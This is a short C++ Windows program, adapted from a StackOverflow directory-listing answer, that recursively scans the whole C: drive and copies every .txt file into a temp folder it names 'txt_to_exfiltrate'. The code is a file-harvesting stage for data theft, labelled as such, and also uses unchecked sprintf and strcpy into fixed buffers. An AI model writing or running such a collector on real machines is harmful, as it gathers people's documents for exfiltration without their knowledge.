// adapted from http://stackoverflow.com/questions/2314542/listing-directory-contents-using-c-and-windows
// cl /EHsc .\iterate_over_all_files_and_copy_only_txt.cpp

#include <windows.h>
#include <stdio.h>

char *ext= "txt";

const char *get_filename_ext(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;
}

char tmpdir[2048];

bool ListDirectoryContents(const char *sDir)
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];

    sprintf(sPath, "%s\\*.*", sDir); 

    if((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        //printf("Path not found: [%s]\n", sDir);
        return false;
    }

    do
    {
		//printf("File: %s, %s\n", sPath, fdFile.cFileName);
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile.cFileName, ".") != 0
                && strcmp(fdFile.cFileName, "..") != 0)
        {
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);

            //Is the entity a File or Folder?
            if(fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                //printf("Directory: %s\n", sPath);
                if(strcmp(sPath, tmpdir) != 0)
					ListDirectoryContents(sPath); //Recursion, I love it!
            }
            else{
                //printf("File: %s, %s\n", sPath, fdFile.cFileName);
				if(!strcmp(get_filename_ext(fdFile.cFileName), ext))
				{
					char aux[1024];
					strcpy(aux, tmpdir);
					strcat(aux, fdFile.cFileName);
					printf("File: %s, %s\n", sPath, fdFile.cFileName);
					CopyFile(sPath, aux, true);
                    printf("Copied at: %s\n", aux);
				}	
            }
        }
    }
    while(FindNextFile(hFind, &fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!

    return true;
}

int main()
{
	GetTempPath(sizeof(tmpdir), tmpdir);
	strcat(tmpdir, "txt_to_exfiltrate/");
	
	CreateDirectory(tmpdir, NULL);
	
	ListDirectoryContents("C:");
	return 0;
}